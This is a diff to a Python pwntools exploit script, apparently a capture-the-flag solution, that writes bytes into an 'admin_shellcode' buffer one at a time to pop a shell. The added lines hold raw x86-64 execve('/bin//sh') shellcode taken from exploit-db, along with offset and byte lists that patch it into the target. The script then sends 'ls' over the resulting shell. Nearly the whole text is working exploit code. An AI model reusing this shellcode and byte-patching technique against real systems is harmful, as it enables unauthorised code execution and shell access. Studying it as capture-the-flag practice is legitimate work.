@@ -10,11 +10,14 @@ print('admin_shellcode:',admin_shellcode)
 
 '''
 Goal: Overwrite one byte of admin_shellcode with a non-null byte
-      to pop a shell.
+      and eventually pop a shell.
 '''
 
-offset = [36, 12, 13]
-byte = [b'\x50', b'\x90',b'\x90']
+#exploit-db.com/exploits/42179
+popshell = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
+
+offset = [36] + [x for x in range(9,9+10)] + [1,2,1] + [3,4] + [x for x in range(5,5+len(popshell))] + [1]
+byte = [b'\x50'] + [b'\x48', b'\xbb', b'\x2f', b'\x62', b'\x69', b'\x6e', b'\x2f', b'\x2f', b'\x73', b'\x68'] + [b'\x04', b'\x1c', b'\xeb'] + [b'\x31', b'\xc0'] + [bytes([ord(i)])for i in popshell] + [b'\x04']
 
 assert all([offset[i] < 0x28 and offset[i] > -1 and byte[i] != b'\0' for i in range(len(offset))])
 
@@ -50,10 +53,6 @@ p.sendline(b"3")
 
 for i in range(len(offset)):
     interact_round(i)
-
-print(p.recv())
-
-p.interactive()
 
 print('ls')
 p.sendline(b'ls')
